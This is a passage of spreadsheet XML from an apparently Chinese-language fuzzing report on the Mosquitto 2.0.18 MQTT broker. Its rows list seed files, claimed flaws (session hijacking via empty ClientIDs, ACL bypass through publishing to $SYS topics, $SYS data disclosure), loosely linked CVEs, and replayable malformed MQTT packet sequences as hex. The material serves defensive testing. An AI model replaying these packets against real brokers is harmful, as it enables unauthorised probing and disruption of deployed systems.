          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B550" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C550" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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550" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 552B (报告+请求数据)\u000a请求数据: 26B\u000a\u000a---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MQTT请求序列(26B原始二进制) ---\u000aMsg[1]: CONNECT Proto=\x00\x13a/bMQTT\x04 v6 ClientID=''(10B) clean_session=False keepalive=15360s [持久会话] | raw_header=1218000a0013612f624d515454040600</f>
        <v/>
      </c>
      <c r="F5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50" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J5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5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51">
      <c r="A551" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B551" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C551" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(104B)\u000a4.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551" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0102 ===\u000a大小: 1228B (报告+请求数据)\u000a请求数据: 104B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(104B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3745 Topics=['$SYS/broker/clients/connected'(QoS=0), '$share/grp1/#'(QoS=0)] | raw_header=82320ea1001d245359532f62726f6b65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\x0e¢\x84è@þ×;1ÖFT\x06ÜÓw¸Ò*\x88Ò\u00092d\x8d\x12Î' | raw_header=3a300013245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=2424\u000a(尾部2B): 2424</f>
        <v/>
      </c>
      <c r="F5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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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5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52">
      <c r="A552" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B552" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C552" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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552" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0103 ===\u000a大小: 908B (报告+请求数据)\u000a请求数据: 235B\u000a\u000a---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MQTT请求序列(235B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=['sensor/+/temp'(QoS=0)] | raw_header=82120001000d73656e736f722f2b2f74\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=145B | raw_header=3aa6010013245359532f62726f6b6572\u000aMsg[3]: UNSUBSCRIBE  | raw_header=a2110002000d73656e73f20006746573\u000aMsg[4]: (不完整,27B) raw=0134100009746573742f716f733200026d736750230002c000e000\u000a(尾部27B): 0134100009746573742f716f733200026d736750230002c000e000</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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5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53">
      <c r="A553" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:010a</t>
        </is>
      </c>
      <c r="B553" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C553" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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553" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:010a ===\u000a大小: 2846B (报告+请求数据)\u000a请求数据: 177B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a\u000a--- MQTT请求序列(177B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=67s [自动清理会话] | raw_header=102200044d51545404c2004300000009\u000aMsg[2]: CONNACK session_present=108 reason_code=101 | raw_header=20436c657f6e53657373506f6e3d3020\u000aMsg[3]: (不完整,72B) raw=436c657f6e53657373506f6e3d30204b506570416c6976653d4b2057696c6c416f7069633d77886c\u000a(尾部72B): 436c657f6e53657373506f6e3d30204b506570416c6976653d4b2057696c6c416f7069633d77886c6c2f616c000057696c6c</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J55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5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54">
      <c r="A554" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:010b</t>
        </is>
      </c>
      <c r="B554" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C554" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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554" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:010b ===\u000a大小: 2792B (报告+请求数据)\u000a请求数据: 85B\u000a\u000a---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MQTT请求序列(85B原始二进制) ---\u000aMsg[1]: CONNECT Proto=\x00\x11senso&lt;\x00\x07fuzz_c6 v130 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12160011001173656e736f3c00076675\u000aMsg[2]: CONNACK  | raw_header=270112\u000aMsg[3]: (不完整,58B) raw=2473686172656c322f6c6576656c332f6c6576656c34010009612f622f632f642f65010012686f6d\u000a(尾部58B): 2473686172656c322f6c6576656c332f6c6576656c34010009612f622f632f642f65010012686f6d652f2b2f74656d70000d</f>
        <v/>
      </c>
      <c r="F5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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J55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5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55">
      <c r="A555" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B555" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C555" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(2987B)\u000a4.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555" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 3702B (报告+请求数据)\u000a请求数据: 2987B\u000a\u000a---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MQTT请求序列(2987B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=ef7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[3]: AUTH  | raw_header=ff7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[4]: PUBREL PacketID=26471 | raw_header=67676767676767676767676767676767\u000aMsg[5]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[6]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[7]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[8]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[9]: TYPE0  | raw_header=017f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[10]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f617f7f7f7f7f7f\u000aMsg[11]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[12]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[13]: CONNECT  | raw_header=1000\u000aMsg[14]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[15]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[16]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7fac7f7f7f7f7f\u000aMsg[17]: PUBCOMP PacketID=32639 | raw_header=7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000aMsg[18]: (不完整,945B) raw=04d37f7f6c7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f\u000a(尾部945B): 04d37f7f6c7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f</f>
        <v/>
      </c>
      <c r="F5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5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55" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J55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5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56">
      <c r="A556" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B556" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C556" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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556" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0182 ===\u000a大小: 1398B (报告+请求数据)\u000a请求数据: 125B\u000a\u000a---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MQTT请求序列(125B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3848 Topics=['$share/grp/test/topic'(QoS=2), '$share/grp1/test/+'(QoS=0)] | raw_header=822f0f0800152473686172652f677270\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=52B | raw_header=31490013245359532f62726f6b65722f\u000aMsg[3]: PUBCOMP  | raw_header=72</f>
        <v/>
      </c>
      <c r="F5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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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5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57">
      <c r="A557" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B557" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C557" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(326B)\u000a4.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557" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0183 ===\u000a大小: 1186B (报告+请求数据)\u000a请求数据: 326B\u000a\u000a---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MQTT请求序列(326B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3442 Topics=[] | raw_header=8283010d72260b94b69d232600132453\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=144B | raw_header=35a5010013245359532f62726f6b6572\u000aMsg[3]: PUBACK  | raw_header=4000\u000aMsg[4]: (不完整,22B) raw=04407f122440ffff4000400004407f122440ffff406a\u000a(尾部22B): 04407f122440ffff4000400004407f122440ffff406a</f>
        <v/>
      </c>
      <c r="F5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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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5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58">
      <c r="A558" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:018b</t>
        </is>
      </c>
      <c r="B558" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C558" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:3,cat:018b)中的REQUEST DATA提取出来(246B)\u000a4.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0x018b\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E558" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:018b ===\u000a大小: 5214B (报告+请求数据)\u000a请求数据: 246B\u000a\u000a---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MQTT请求序列(246B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=['sens\x00&lt;\x00\u0009clien'(QoS=0)] | raw_header=82120001000d73656e73003c0009636c\u000aMsg[2]: PUBREC PacketID=12544 | raw_header=5f3031000a77696c6c2f746f70696300\u000aMsg[3]: SUBSCRIBE PacketID=16 Topics=['$SYS/#'(QoS=0)] | raw_header=820b00100006245359532f2300\u000aMsg[4]: SUBSCRIBE PacketID=2741 Topics=['#'(QoS=1), 'sensor/temp'(QoS=2)] | raw_header=82140ab500012301000b73656e736f72\u000aMsg[5]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=2 retain=True payload_len=50B | raw_header=355f002b766572792f646565702f746f\u000aMsg[6]: (不完整,44B) raw=00ff7065727369737401742000000000301600146481766963652f2b2f74656c656d657472792f23\u000a(尾部44B): 00ff7065727369737401742000000000301600146481766963652f2b2f74656c656d657472792f23c000e000</f>
        <v/>
      </c>
      <c r="F5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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J55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5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59">
      <c r="A559" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:01c0</t>
        </is>
      </c>
      <c r="B559" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C559" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D5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559" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:01c0 ===\u000a大小: 642B (报告+请求数据)\u000a请求数据: 120B\u000a\u000a---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MQTT请求序列(120B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=9766 Topics=[] | raw_header=8a262626262626262626262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F5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9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59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59" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J559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55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60">
      <c r="A560" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B560" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C560" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(137B)\u000a4.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560" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:01c1 ===\u000a大小: 855B (报告+请求数据)\u000a请求数据: 137B\u000a\u000a---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MQTT请求序列(137B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=180 Topics=[] | raw_header=821200b4001f73206eff206d7000a202\u000aMsg[2]: CONNACK  | raw_header=2600\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626261226262626262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[5]: (不完整,35B) raw=262626262626262626262626262626262626262626262626260d737fffffff2f2b6d70\u000a(尾部35B): 262626262626262626262626262626262626262626262626260d737fffffff2f2b6d70</f>
        <v/>
      </c>
      <c r="F5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6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60" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J56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6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61">
      <c r="A561" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B561" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C561" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(33898B)\u000a4.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0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E561" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 6494B (报告+请求数据)\u000a请求数据: 33898B\u000a\u000a---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MQTT请求序列(33898B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a013a3a3a3a3a3a3a3a3a\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a23\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[5]: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raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[8]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[9]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[10]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[11]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[12]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a000001003a3a3a3a3a3a\u000aMsg[13]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[14]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[15]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[16]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[17]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a103a3a3a3a3a3a3a3a\u000aMsg[18]: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raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[21]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[22]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[23]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[24]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[25]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000a(尾部2738B): 3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a</f>
        <v/>
      </c>
      <c r="F5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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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6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62">
      <c r="A562" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:020e</t>
        </is>
      </c>
      <c r="B562" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C562" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(893B)\u000a4.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0x020e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E562" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:020e ===\u000a大小: 4880B (报告+请求数据)\u000a请求数据: 893B\u000a\u000a---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MQTT请求序列(893B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a100\u000aMsg[2]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[3]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363632363636363636363636363636\u000aMsg[4]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363616363654363636363636\u000aMsg[5]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[6]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=363636363636360001000036363636d4\u000aMsg[7]: PINGRESP  | raw_header=d4d40080d4d4d4d4d4d4d4d4d4d4d4d4\u000aMsg[8]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[9]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363613363636363636363636\u000aMsg[10]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=363636363636363636363636a3363636\u000aMsg[11]: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raw_header=36363636363636363636821c02190001\u000aMsg[16]: (不完整,76B) raw=1aca84da60eccbf22c66fe2bd6adf971037c47b10ad5a5363636363636363636366e646436364140\u000a(尾部76B): 1aca84da60eccbf22c66fe2bd6adf971037c47b10ad5a5363636363636363636366e646436364140363636019a990e6e6464</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J56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6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63">
      <c r="A563" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B563" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C563" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1286B)\u000a4.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0x0286\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E563" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 4486B (报告+请求数据)\u000a请求数据: 1286B\u000a\u000a---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MQTT请求序列(1286B原始二进制) ---\u000aMsg[1]: PUBLISH Topic=';;;;;;;;;;;;\x82\x1d\x00u\x00\x00\x13$SYS/broke' QoS=1 retain=True payload_len=88B | raw_header=3b77001d3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[5]: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raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[17]: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(不完整,6B) raw=3b3b3b3b3b00\u000a(尾部6B): 3b3b3b3b3b00</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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6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64">
      <c r="A564" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:028e</t>
        </is>
      </c>
      <c r="B564" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C564" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1387B)\u000a4.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0x028e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E564" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:028e ===\u000a大小: 5874B (报告+请求数据)\u000a请求数据: 1387B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b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MQTT请求序列(1387B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=29524 | raw_header=6e167354747a30315f3c3c3c3c3c3c3c\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload='\x00\x94Z\u0009\x9d§rH-¿Mwª'ÁÚkS\x82Ò\x91\x01\x0cpëÅéÂ«näõÏ&gt;þ' | raw_header=35380013245359532f62726f6b65722f\u000aMsg[4]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[5]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[6]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[7]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[8]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[9]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[10]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[11]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[12]: PUBLISH Topic='?' QoS=2 retain=False payload='' | 